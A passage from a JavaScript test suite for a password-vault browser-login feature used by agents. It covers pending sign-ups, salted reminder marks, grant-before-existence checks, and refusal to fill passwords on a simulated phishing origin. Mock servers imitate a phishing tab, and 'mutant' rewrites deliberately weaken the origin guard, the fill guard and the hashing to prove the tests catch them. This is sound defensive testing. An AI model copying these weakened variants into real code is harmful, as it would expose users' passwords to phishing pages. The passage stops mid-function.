            const mTkAns = logM24.answerCard(mTkOffer.id, { approve: true, shown: mTkOffer.shown, who: 'owner' });
            const mGen = logM24.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#aguser/password', generate: true, facts: { conversationKeys: ['conv-ag'] }, owners: ['conv-ag'] });
            const mCfm = logM24.confirmOwn('web-login:https://shop.example.test#reg1', { who: 'owner' });
            const mDsc = logM24.discardPending('web-login:https://shop.example.test#reg2', { who: 'owner' });
            const mListRow = (logM24.list().entries || []).find((e) => e.user === 'tuser');
            ok(twiceNull
              && !mUpd.ok && mUpd.code === 'bad-record'
              && !mCard.ok && mCard.code === 'bad-record'
              && !mTkAns.ok && mTkAns.code === 'bad-record'
              && !mGen.ok && mGen.code === 'login_no_entry'
              && !mCfm.ok && mCfm.code === 'login_not_pending'
              && !mDsc.ok && mDsc.code === 'login_not_pending'
              && mListRow && !('hasCurrent' in mListRow) && !('totpName' in mListRow),
              `MUTANT 24 RED (r26 Compulsory 1 non-idempotent recordOf) [${oracle390Label}]: r25 let schema=1 makes recordOf(recordOf(x))===null and fails window update, login card, takeover card, --generate, confirm, discard, and list facts on .390 entries`,
              { twiceNull, mUpd: mUpd.code, mCard: mCard.code, mTkAns: mTkAns.code, mGen: mGen.code, mCfm: mCfm.code, mDsc: mDsc.code, mListRow });
          } finally {
            engM24.close();
          }
        } else ok(false, 'MUTANT 24 RED (r26 Compulsory 1): anchor not found');

        // ── r27 COMPULSORY 1: 8-day-old `.390`-written `pending: 'register'` ×3 -> 0 writes on unlock/list/fill/restart, byte-identical vault.json, master still reads `pending = 'register'`, 1 reminder each + MUTANT 30 RED (r26 writeEntry stamp) ──
        {
          const agedBaseDir = path.join(dirC1, 'r27-aged-base');
          const agedGreenDir = path.join(dirC1, 'r27-aged-green');
          const agedRedDir = path.join(dirC1, 'r27-aged-red');
          fs.mkdirSync(agedBaseDir, { recursive: true });
          const agedVpw = 'R27#AgedVaultPass9';
          const agedNow = Date.now() - 8 * 86_400_000;
          {
            const eng390Aged = VE.create({ dataDir: agedBaseDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => agedNow });
            await eng390Aged.setup(agedVpw);
            if (BL390 && LM390) {
              const g390Aged = GS.create({ memory: true });
              const log390Aged = LM390.create({ vault: eng390Aged, grants: () => g390Aged, now: () => agedNow, log: () => {} });
              log390Aged.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'AliceAged390Pw!1' }, { who: 'owner' });
              log390Aged.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-aged');
              const signupForm = BL390.formOf({
                surfaceId: 's-aged',
                targetId: 't-aged',
                pageOrigin: 'https://shop.example.test',
                frameOrigin: 'https://shop.example.test',
                kind: 'signup',
                fields: [{ fieldId: 'f-u', type: 'username' }, { fieldId: 'f-p', type: 'new-password' }],
              });
              for (const u of ['agedreg1', 'agedreg2', 'agedreg3']) {
                const pf = log390Aged.planFill({
                  forms: [signupForm],
                  origin: 'https://shop.example.test',
                  newUser: u,
                  generate: true,
                  facts: { conversationKeys: ['conv-aged'] },
                  conv: 'conv-aged',
                  actor: 'Aged Signup Agent',
                });
                if (!pf || !pf.ok) throw new Error(`failed to seed .390 aged signup ${u}: ${JSON.stringify(pf)}`);
              }
            } else {
              eng390Aged.secretPut('web-login:https://shop.example.test#alice', JSON.stringify({
                v: 1, origin: 'https://shop.example.test', username: 'alice', createdAt: agedNow,
                by: 'owner', source: 'owner', strength: 'unknown', password: 'AliceAged390Pw!1',
              }), { kind: 'owner' });
              for (const [idx, u] of ['agedreg1', 'agedreg2', 'agedreg3'].entries()) {
                eng390Aged.secretPut(`web-login:https://shop.example.test#${u}`, JSON.stringify({
                  v: 1, origin: 'https://shop.example.test', username: u, createdAt: agedNow,
                  by: 'agent', source: 'vault-minted', strength: 'generated',
                  password: `AgedRegPw!${idx + 1}234567890123`, pending: 'register',
                }), { kind: 'vault-minted', actor: 'Aged Signup Agent' });
              }
            }
            eng390Aged.close();
          }
          fs.cpSync(agedBaseDir, agedGreenDir, { recursive: true });
          fs.cpSync(agedBaseDir, agedRedDir, { recursive: true });

          const vaultJsonBefore = fs.readFileSync(path.join(agedGreenDir, 'vault.json'));
          const remindItems = [];
          const forYouAged = {
            add: (_pid, it) => { const id = 'rem-' + (remindItems.length + 1); remindItems.push({ id, ...it }); return id; },
            resolve: () => {},
          };
          let putsBoot1 = 0;
          let batchesBoot1 = 0;
          let fillBoot1Ok = false;
          let listBoot1PendingCount = 0;
          // Boot 1: Hub starts LOCKED -> unlock -> list() -> granted resolveFill
          {
            const eng1 = VE.create({ dataDir: agedGreenDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            const origPut1 = eng1.secretPut.bind(eng1);
            const origBatch1 = eng1.batchRecordWrite.bind(eng1);
            eng1.secretPut = (...a) => { putsBoot1++; return origPut1(...a); };
            eng1.batchRecordWrite = (...a) => { batchesBoot1++; return origBatch1(...a); };
            const g1 = GS.create({ memory: true });
            const log1 = Lm.create({ vault: eng1, grants: () => g1, forYou: forYouAged, log: () => {} });
            log1.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-aged');
            await eng1.unlock(agedVpw);
            const l1 = log1.list();
            listBoot1PendingCount = (l1.entries || []).filter((e) => e.pending === 'register').length;
            const rf1 = log1.resolveFill({
              tabOrigin: 'https://shop.example.test',
              spec: 'shop.example.test#alice/password',
              facts: { conversationKeys: ['conv-aged'] },
              conv: 'conv-aged',
            });
            fillBoot1Ok = Boolean(rf1 && rf1.ok && rf1.value === 'AliceAged390Pw!1');
            eng1.close();
          }
          const remindsAfterBoot1 = remindItems.length;

          // Boot 2 (simulated Hub restart on the SAME dataDir): starts LOCKED -> unlock -> list() -> granted resolveFill -> 0 duplicate reminders, 0 writes!
          let putsBoot2 = 0;
          let batchesBoot2 = 0;
          let fillBoot2Ok = false;
          let masterStillPendingAll3 = true;
          {
            const eng2 = VE.create({ dataDir: agedGreenDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            const origPut2 = eng2.secretPut.bind(eng2);
            const origBatch2 = eng2.batchRecordWrite.bind(eng2);
            eng2.secretPut = (...a) => { putsBoot2++; return origPut2(...a); };
            eng2.batchRecordWrite = (...a) => { batchesBoot2++; return origBatch2(...a); };
            const g2 = GS.create({ memory: true });
            const log2 = Lm.create({ vault: eng2, grants: () => g2, forYou: forYouAged, log: () => {} });
            log2.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-aged');
            await eng2.unlock(agedVpw);
            log2.list();
            const rf2 = log2.resolveFill({
              tabOrigin: 'https://shop.example.test',
              spec: 'shop.example.test#agedreg1/password',
              facts: { conversationKeys: ['conv-aged'] },
              conv: 'conv-aged',
            });
            fillBoot2Ok = Boolean(rf2 && rf2.ok && rf2.slot === 'pending');
            for (const u of ['agedreg1', 'agedreg2', 'agedreg3']) {
              const rawTxt = eng2.secretGet(`web-login:https://shop.example.test#${u}`).value.toString('utf8');
              const parsedRaw = JSON.parse(rawTxt);
              const masterPending = BL390 ? BL390.recordOf(rawTxt)?.pending : parsedRaw.pending;
              if (masterPending !== 'register' || typeof parsedRaw.pending !== 'string') masterStillPendingAll3 = false;
            }
            eng2.close();
          }
          const vaultJsonAfter = fs.readFileSync(path.join(agedGreenDir, 'vault.json'));
          const vaultByteIdentical = Buffer.compare(vaultJsonBefore, vaultJsonAfter) === 0;
          const remindLedgerPath = path.join(agedGreenDir, 'browser-login-reminders.json');
          const remindLedgerRaw = fs.existsSync(remindLedgerPath)
            ? fs.readFileSync(remindLedgerPath, 'utf8')
            : '';
          const remindLedgerMode0600 = fs.existsSync(remindLedgerPath) && ((fs.statSync(remindLedgerPath).mode & 0o777) === 0o600);
          const remindLedgerZeroPlainNames = Boolean(
            remindLedgerRaw
            && !remindLedgerRaw.includes('agedreg1')
            && !remindLedgerRaw.includes('shop.example.test')
            && !remindLedgerRaw.includes('AliceAged390Pw!1')
          );
          ok(putsBoot1 === 0 && batchesBoot1 === 0 && putsBoot2 === 0 && batchesBoot2 === 0
            && vaultByteIdentical && listBoot1PendingCount === 3 && fillBoot1Ok && fillBoot2Ok
            && masterStillPendingAll3 && remindsAfterBoot1 === 3 && remindItems.length === 3
            && remindLedgerZeroPlainNames && remindLedgerMode0600,
            `r27 Compulsory 1 [${oracle390Label}]: 8-day-old .390 pending registrations ×3 incur 0 secretPut writes across unlock + list + fill + restart, keep vault.json byte-identical and .390 pending="register" intact, and file each reminder ONCE (3 total across restart, mode 0600)`,
            { putsBoot1, batchesBoot1, putsBoot2, batchesBoot2, vaultByteIdentical, listBoot1PendingCount, fillBoot1Ok, fillBoot2Ok, masterStillPendingAll3, remindsAfterBoot1, remindsAfterRestart: remindItems.length, remindLedgerMode0600 });

          // MUTANT 30 RED (r27 Compulsory 1 — r26 shape where maybeRemindPending stamps remindedAt via writeEntry):
          const m30LgSrc = lgSrc.replace(
            '      if (filed) {\n        remindedDigests.add(digest);\n        dirty = true;\n        reminded++;\n      }',
            '      if (filed) {\n        const stamped = { ...o.rec, schema: 2, pending: { ...o.rec.pending, remindedAt: t } };\n        writeEntry(e.name, stamped, { actor: e.actor, owner: e.owner });\n        reminded++;\n      }',
          );
          if (m30LgSrc !== lgSrc) {
            const LM_M30 = MUT.load('src/server/browser-logins.js', m30LgSrc, 'r27-c1-remind-rewrites-entry');
            const engM30 = VE.create({ dataDir: agedRedDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            let putsM30 = 0;
            const origPutM30 = engM30.secretPut.bind(engM30);
            engM30.secretPut = (...a) => { putsM30++; return origPutM30(...a); };
            const gM30 = GS.create({ memory: true });
            LM_M30.create({ vault: engM30, grants: () => gM30, forYou: { add: () => 'id', resolve: () => {} }, log: () => {} });
            await engM30.unlock(agedVpw);
            let masterLostPendingAll3 = true;
            for (const u of ['agedreg1', 'agedreg2', 'agedreg3']) {
              const rawTxt = engM30.secretGet(`web-login:https://shop.example.test#${u}`).value.toString('utf8');
              const parsedRaw = JSON.parse(rawTxt);
              const masterPending = BL390 ? BL390.recordOf(rawTxt)?.pending : (typeof parsedRaw.pending === 'string' ? parsedRaw.pending : undefined);
              if (masterPending !== undefined || parsedRaw.schema !== 2) masterLostPendingAll3 = false;
            }
            const redVaultAfter = fs.readFileSync(path.join(agedRedDir, 'vault.json'));
            engM30.close();
            ok(putsM30 === 3 && Buffer.compare(vaultJsonBefore, redVaultAfter) !== 0 && masterLostPendingAll3,
              `MUTANT 30 RED (r27 Compulsory 1 r26-remind-stamp) [${oracle390Label}]: r26 writeEntry inside maybeRemindPending triggers secretPut=3 on unlock and turns .390 pending registrations into confirmed logins on rollback`,
              { putsM30, masterLostPendingAll3 });
          } else ok(false, 'MUTANT 30 RED (r27 Compulsory 1): anchor not found');

          // DEK-keyed reminder marks pin (zero unsalted digests on disk) + MUTANT 33 RED:
          // Same pending entry `(name, rev, kind, createdAt)` under two independent DEKs MUST produce completely disjoint
          // 32-hex marks, and zero marks may equal any unsalted sha256 prefix of name/origin/user/pendingRemindKey.
          const runTwoDekMarksProbe = async (LoginsMod, tag) => {
            const outMarks = [];
            const outModes = [];
            const sameEntryName = 'web-login:https://shop.example.test#agedreg1';
            const sameRec = BL.newRecord({
              origin: 'https://shop.example.test',
              username: 'agedreg1',
              password: 'DekPinPendingPw!1234567890',
              source: 'vault-minted',
              pending: 'register',
              now: agedNow,
              conversation: 'conv-dek',
            });
            const rkExpected = BL.pendingRemindKey(sameEntryName, sameRec);
            for (const sub of ['dek-a', 'dek-b']) {
              const d = path.join(dirC1, `${tag}-${sub}`);
              fs.mkdirSync(d, { recursive: true });
              const ev = VE.create({ dataDir: d, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => agedNow });
              await ev.setup(`DekPass#${sub}!9`);
              ev.secretPut(sameEntryName, BL.textOf(sameRec), { kind: 'vault-minted', rev: 1, pending: 'register' });
              ev.close();
              const evOpen = VE.create({ dataDir: d, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
              const gm = GS.create({ memory: true });
              LoginsMod.create({ dataDir: d, vault: evOpen, grants: () => gm, forYou: { add: () => 'id', resolve: () => {} }, log: () => {} });
              await evOpen.unlock(`DekPass#${sub}!9`);
              evOpen.close();
              const f = path.join(d, 'browser-login-reminders.json');
              const parsed = JSON.parse(fs.readFileSync(f, 'utf8'));
              outModes.push(fs.statSync(f).mode & 0o777);
              outMarks.push(Array.isArray(parsed.reminded) ? parsed.reminded : []);
            }
            const unsaltedCandidates = [
              rkExpected,
              sameEntryName,
              'https://shop.example.test',
              'shop.example.test',
              'agedreg1',
              `${sameEntryName}\u00001`,
              `${sameEntryName}\u0000register`,
              `${sameEntryName}\u00001\u0000register`,
            ].map((s) => crypto.createHash('sha256').update(String(s)).digest('hex').slice(0, 32));
            return { marksA: outMarks[0], marksB: outMarks[1], modes: outModes, unsaltedCandidates, shaRk32: unsaltedCandidates[0] };
          };
          const dekPin = await runTwoDekMarksProbe(Lm, 'real-dek');
          const agedParsedMarks = remindLedgerRaw ? (JSON.parse(remindLedgerRaw).reminded || []) : [];
          const agedUnsaltedSet = new Set();
          for (const u of ['agedreg1', 'agedreg2', 'agedreg3']) {
            const nm = `web-login:https://shop.example.test#${u}`;
            for (const cand of [nm, u, 'https://shop.example.test', `${nm}\u00001\u0000register\u0000${agedNow}`]) {
              agedUnsaltedSet.add(crypto.createHash('sha256').update(cand).digest('hex').slice(0, 32));
            }
          }
          ok(dekPin.marksA.length === 1 && dekPin.marksB.length === 1
            && /^[0-9a-f]{32}$/.test(dekPin.marksA[0]) && /^[0-9a-f]{32}$/.test(dekPin.marksB[0])
            && dekPin.modes[0] === 0o600 && dekPin.modes[1] === 0o600
            && dekPin.marksA[0] !== dekPin.marksB[0]
            && !dekPin.unsaltedCandidates.includes(dekPin.marksA[0])
            && !dekPin.unsaltedCandidates.includes(dekPin.marksB[0])
            && agedParsedMarks.length === 3 && agedParsedMarks.every((m) => !agedUnsaltedSet.has(m)),
            'r27 DEK-keyed reminder marks (RULE 5′): swapping the vault DEK produces completely distinct 32-hex marks in browser-login-reminders.json (mode 0600 via writeJsonAtomic), and zero marks match any unsalted sha256 prefix',
            dekPin);

          const m33LgSrc = lgSrc.replace(
            "      const mac = vault.macOf('browser-login-remind', rk);",
            "      const mac = crypto.createHash('sha256').update(rk).digest('hex');",
          );
          if (m33LgSrc !== lgSrc) {
            const LM_M33 = MUT.load('src/server/browser-logins.js', m33LgSrc, 'r27-remind-unsalted-sha256');
            const dekMut = await runTwoDekMarksProbe(LM_M33, 'mut33-dek');
            ok(dekMut.marksA.length === 1 && dekMut.marksA[0] === dekMut.marksB[0] && dekMut.marksA[0] === dekMut.shaRk32,
              'MUTANT 33 RED (r27 unsalted-remind-sha256): replacing vault.macOf with unsalted sha256(rk) yields identical 32-hex marks across different DEKs and matches sha256(rk).slice(0, 32)',
              dekMut);
          } else ok(false, 'MUTANT 33 RED (r27 unsalted-remind-sha256): anchor not found');
        }
      }

      // ── r26 COMPULSORY 2 (Fast Legs): Dangerous-direction Browser-vs-DOM mismatch + MUTANT 25 RED + in-flight cross-origin nav hold/guard + MUTANT 26 RED ──
      {
        const { WebSocketServer } = require(path.join(REPO, 'node_modules/ws'));

        // Leg A: Dangerous direction — browser truth (`Target.getTargetInfo` / `Page.getFrameTree` / `trackedUrl`) is on
        // `https://evil.example.test/phish`, while isolated-world DOM `location.origin` claims `https://shop.example.test`!
        let evilInsertCount = 0;
        const revWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
        await new Promise((r) => revWss.once('listening', r));
        revWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Browser.getVersion') sock.send(JSON.stringify({ id: m.id, result: { product: 'Chrome/154', userAgent: 'HeadlessChrome/154' } }));
            else if (m.method === 'Target.getTargets') sock.send(JSON.stringify({ id: m.id, result: { targetInfos: [{ targetId: 'T-REV', type: 'page', url: 'https://evil.example.test/phish', title: 'Evil' }] } }));
            else if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-rev' } }));
            else if (m.method === 'Target.getTargetInfo') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { targetInfo: { targetId: 'T-REV', type: 'page', url: 'https://evil.example.test/phish' } } }));
            else if (m.method === 'Page.getFrameTree') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { frameTree: { frame: { id: 'T-REV', url: 'https://evil.example.test/phish', securityOrigin: 'https://evil.example.test' } } } }));
            else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 11 } }));
            else if (m.method === 'Runtime.evaluate') {
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } } }));
            } else if (m.method === 'Input.insertText') {
              evilInsertCount++;
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
            } else {
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
            }
          });
        });
        try {
          const kRev = { ...skR24, cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${revWss.address().port}` }) };
          const wRev = Dm.create({ keeper: kRev, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
          await wRev.arm('bp-rev');
          wRev.noteActiveTab({ profileId: 'bp-rev', browserKey: 'bk-mr24' }, 'T-REV');
          const rRevFill = await wRev.fillVaultField({ profileId: 'bp-rev', browserKey: 'bk-mr24' }, {
            target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] },
          });
          wRev.shutdown();

          const stubDangerCall = async (method) => {
            if (method === 'Page.getFrameTree') return { result: { frameTree: { frame: { id: 'F-EVIL', url: 'https://evil.example.test/phish', securityOrigin: 'https://evil.example.test' } } } };
            if (method === 'Target.getTargetInfo') return { result: { targetInfo: { targetId: 'T-REV', url: 'https://evil.example.test/phish' } } };
            if (method === 'Page.createIsolatedWorld') return { result: { executionContextId: 11 } };
            if (method === 'Runtime.evaluate') return { result: { result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } } };
            return { result: {} };
          };
          const realIsoDanger = await LF.openIsolatedOrigin({
            call: stubDangerCall,
            browserCall: stubDangerCall,
            targetId: 'T-REV',
            trackedUrl: () => 'https://evil.example.test/phish',
          });

          ok(!rRevFill.ok && rRevFill.code === 'login_phishing' && evilInsertCount === 0
            && !realIsoDanger.ok && realIsoDanger.code === 'origin_mismatch' && realIsoDanger.browserOrigin === 'https://evil.example.test' && realIsoDanger.isoOrigin === 'https://shop.example.test',
            'r26 Compulsory 2 (dangerous direction): browser on https://evil.example.test while isolated-world DOM claims https://shop.example.test is refused login_phishing with 0 Input.insertText calls',
            { rRevFill, evilInsertCount, realIsoDanger });

          // MUTANT 25 RED (Compulsory 2 verifier mutant): overwrite `frameOrigin = secOrigin = targetOrigin = isoOrigin; trackedOrigin = null;` before `const allAgree` in `openIsolatedOrigin`!
          const m25LfSrc = lfSrc.replace(
            '    const allAgree = !!(frameOrigin && secOrigin && targetOrigin && isoOrigin',
            '    frameOrigin = secOrigin = targetOrigin = isoOrigin; trackedOrigin = null;\n    const allAgree = !!(frameOrigin && secOrigin && targetOrigin && isoOrigin',
          );
          const LF_M25 = m25LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m25LfSrc, 'r26-c2-trusts-iso-origin') : null;
          if (LF_M25) {
            const mutIsoDanger = await LF_M25.openIsolatedOrigin({
              call: stubDangerCall,
              browserCall: stubDangerCall,
              targetId: 'T-REV',
              trackedUrl: () => 'https://evil.example.test/phish',
            });
            ok(mutIsoDanger.ok === true && mutIsoDanger.origin === 'https://shop.example.test',
              'MUTANT 25 RED (r26 Compulsory 2 trusts-iso-origin): verifier mutant replacing browser/frame/security origins with isoOrigin accepts https://shop.example.test on https://evil.example.test tab',
              mutIsoDanger);
          } else ok(false, 'MUTANT 25 RED (r26 Compulsory 2): anchor not found');
        } finally {
          await new Promise((r) => revWss.close(r));
        }

        // Leg B: Cross-origin jump between `armAndPrepareTargetExpr` returning `{ ok: true }` and `Input.insertText`!
        // Both (1) a cross-origin top-frame `Document` `Fetch.requestPaused` (held during fill!) AND (2) a `Page.frameStartedNavigating`
        // event arriving right as `armAndPrepareTargetExpr` resolves are refused `login_phishing` with `0` `Input.insertText` calls;
        // MUTANT 26 (removing `myActiveFill` + `guardBeforeInsert`) types the password (`insertCalls === 1`)!
        const runJumpWindowProbe = async (DialogsMod, mode) => {
          let insertCalls = 0;
          let continuedBeforeFillDone = false;
          let fillFinished = false;
          let continueCount = 0;
          const navWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
          await new Promise((r) => navWss.once('listening', r));
          navWss.on('connection', (sock) => {
            let evalStep = 0;
            sock.on('message', (raw) => {
              const m = JSON.parse(String(raw));
              if (m.method === 'Browser.getVersion') sock.send(JSON.stringify({ id: m.id, result: { product: 'Chrome/154', userAgent: 'HeadlessChrome/154' } }));
              else if (m.method === 'Target.getTargets') sock.send(JSON.stringify({ id: m.id, result: { targetInfos: [{ targetId: 'T-JUMP', type: 'page', url: 'https://shop.example.test/login', title: 'Shop' }] } }));
              else if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-jump' } }));
              else if (m.method === 'Target.getTargetInfo') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { targetInfo: { targetId: 'T-JUMP', type: 'page', url: 'https://shop.example.test/login' } } }));
              else if (m.method === 'Page.getFrameTree') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { frameTree: { frame: { id: 'T-JUMP', url: 'https://shop.example.test/login', securityOrigin: 'https://shop.example.test' } } } }));
              else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 21 } }));
              else if (m.method === 'Fetch.continueRequest' || m.method === 'Fetch.failRequest' || m.method === 'Fetch.continueResponse') {
                continueCount++;
                if (!fillFinished) continuedBeforeFillDone = true;
                sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
              } else if (m.method === 'Runtime.evaluate') {
                const expr = String(m.params?.expression || '');
                evalStep++;
                if (expr.includes('isoOrigin')) {
                  sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } } }));
                } else if (expr.includes('vsFocusHijacked = false')) {
                  // `armAndPrepareTargetExpr`! Emit the cross-site jump right BEFORE sending `{ ok: true }` on the CDP socket!
                  if (mode === 'fetch-hold') {
                    sock.send(JSON.stringify({
                      method: 'Fetch.requestPaused',
                      sessionId: 's-jump',
                      params: { requestId: 'req-jump-1', frameId: 'T-JUMP', resourceType: 'Document', request: { url: 'https://evil.example.test/catch', method: 'GET', headers: {} } },
                    }));
                  } else {
                    sock.send(JSON.stringify({
                      method: 'Page.frameStartedNavigating',
                      sessionId: 's-jump',
                      params: { frameId: 'T-JUMP', url: 'https://evil.example.test/catch', navigationType: 'differentDocument' },
                    }));
                  }
                  sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true } } } }));
                } else {
                  sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true, verifiedEmpty: true } } } }));
                }
                void evalStep;
              } else if (m.method === 'Input.insertText') {
                insertCalls++;
                sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
              } else {
                sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
              }
            });
          });
          try {
            const kJump = { ...skR24, cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${navWss.address().port}` }) };
            const wJump = DialogsMod.create({ keeper: kJump, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
            await wJump.arm('bp-jump');
            wJump.noteActiveTab({ profileId: 'bp-jump', browserKey: 'bk-mr24' }, 'T-JUMP');
            const res = await wJump.fillVaultField({ profileId: 'bp-jump', browserKey: 'bk-mr24' }, {
              target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] },
            });
            fillFinished = true;
            await new Promise((r) => setTimeout(r, 20));
            wJump.shutdown();
            return { res, insertCalls, continuedBeforeFillDone, continueCount };
          } finally {
            await new Promise((r) => navWss.close(r));
          }
        };

        const pFetchHold = await runJumpWindowProbe(Dm, 'fetch-hold');
        const pNavGuard = await runJumpWindowProbe(Dm, 'frame-nav');
        ok(!pFetchHold.res.ok && pFetchHold.res.code === 'login_phishing' && pFetchHold.insertCalls === 0 && !pFetchHold.continuedBeforeFillDone && pFetchHold.continueCount >= 1
          && !pNavGuard.res.ok && pNavGuard.res.code === 'login_phishing' && pNavGuard.insertCalls === 0,
          'r26 Compulsory 2 (prepare->insertText window): cross-origin top-frame Document Fetch is held until fill exits and both Fetch pause & frameStartedNavigating refuse login_phishing with 0 Input.insertText calls',
          { pFetchHold, pNavGuard });

        const m26BdSrc = bdSrc.replace(
          '    const myActiveFill = !checkOnly ? {',
          '    const myActiveFill = false ? {',
        );
        const BD_M26 = m26BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m26BdSrc, 'r26-c2-no-activefill-guard') : null;
        if (BD_M26) {
          const mutNavLeak = await runJumpWindowProbe(BD_M26, 'frame-nav');
          ok(mutNavLeak.insertCalls === 1,
            'MUTANT 26 RED (r26 Compulsory 2 no-activefill-guard): without activeFill hold/guard, cross-site jump after prepare receives Input.insertText (insertCalls === 1)',
            mutNavLeak);
        } else ok(false, 'MUTANT 26 RED (r26 Compulsory 2): anchor not found');
      }

      // ── r26 MINOR 1: Grant checked BEFORE existence (`0, 1, 3` logins × `{no user, #alice, #nobody}` all return identical `403 login_not_granted`) + MUTANT 27 RED ──
      {
        const gM1 = GS.create({ memory: true });
        const dirM1 = path.join(dirM10, 'r26-minor-1');
        fs.mkdirSync(dirM1, { recursive: true });
        const engM1 = VE.create({ dataDir: dirM1, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
        await engM1.setup('Minor1#Pass9');
        try {
          const logM1 = Lm.create({ vault: engM1, grants: () => gM1, log: () => {} });
          logM1.addOwn({ origin: 'https://one-site.example.test', username: 'alice', password: 'Pw1!aaaaAAAA' }, { who: 'owner' });
          for (const u of ['alice', 'bob', 'carol']) {
            logM1.addOwn({ origin: 'https://three-site.example.test', username: u, password: `Pw3!${u}AAAA` }, { who: 'owner' });
          }
          const sites = ['https://zero-site.example.test', 'https://one-site.example.test', 'https://three-site.example.test'];
          const suffixes = ['/password', '#alice/password', '#nobody/password'];
          const verdicts = [];
          for (const site of sites) {
            for (const sfx of suffixes) {
              const r = logM1.resolveFill({
                tabOrigin: site,
                spec: `${site}${sfx}`,
                facts: { conversationKeys: ['ungranted-conv'] },
                conv: 'ungranted-conv',
              });
              verdicts.push({ site, sfx, code: r.code, error: r.error, normError: String(r.error || '').replaceAll(site, '<SITE>') });
            }
          }
          const firstNorm = verdicts[0].normError;
          const allSame403 = verdicts.every((v) => v.code === 'login_not_granted' && v.normError === firstNorm);
          ok(verdicts.length === 9 && allSame403,
            'r26 Minor 1: ungranted caller gets identical login_not_granted code and sentence across {0, 1, 3 logins} x {bare site, #alice, #nobody} (zero existence oracle)',
            verdicts);

          // MUTANT 27 RED: restore r25's `if (!onSite.length) return no('login_no_entry', ...)` before `checkGrantFor('')`!
          const m27BlSrc = blSrc.replace(
            "      if (!onSite.length) {\n        const gmSite = checkGrantFor('');\n        if (!gmSite.ok) {\n          return no('login_not_granted', grantWords(gmSite.code || 'no_grant', spec.origin, false, ''), {\n            grant: gmSite.code || 'no_grant',\n            origin: spec.origin,\n          });\n        }",
            "      if (!onSite.length) {\n        if (false) checkGrantFor('');",
          );
          const BL_M27 = m27BlSrc !== blSrc ? MUT.load('src/browser-login.js', m27BlSrc, 'r26-m1-no-entry-before-grant') : null;
          if (BL_M27) {
            const vZero = BL_M27.fillVerdict({
              tabOrigin: 'https://zero-site.example.test',
              spec: BL_M27.parseVaultFillSpec('https://zero-site.example.test/password'),
              entries: [],
              grantRows: () => [],
              facts: { conversationKeys: ['ungranted-conv'] },
            });
            const vOne = BL_M27.fillVerdict({
              tabOrigin: 'https://one-site.example.test',
              spec: BL_M27.parseVaultFillSpec('https://one-site.example.test/password'),
              entries: [{ origin: 'https://one-site.example.test', user: 'alice', name: 'web-login:https://one-site.example.test#alice' }],
              grantRows: () => [],
              facts: { conversationKeys: ['ungranted-conv'] },
            });
            ok(vZero.code === 'login_no_entry' && vOne.code === 'login_not_granted',
              'MUTANT 27 RED (r26 Minor 1 no-entry-before-grant): checking !onSite.length before grant leaks login_no_entry vs login_not_granted to ungranted caller',
              { zero: vZero.code, one: vOne.code });
          } else ok(false, 'MUTANT 27 RED (r26 Minor 1): anchor not found');
        } finally {
          engM1.close();
        }
      }

      // ── r26 MINOR 2: One `/otp` fill = 1 `totpCode` mint + 1 `vault-totp-use` line; 6 consecutive fills in 1 min ALL succeed + MUTANT 28 RED ──
      {
        const VT = require(path.join(REPO, 'src/server/vault-totp.js'));
        const express = require(path.join(REPO, 'node_modules/express'));
        const RB = require(path.join(REPO, 'src/routes/browser.js'));

        const runOtpQuotaProbe = async (LoginsMod, tag) => {
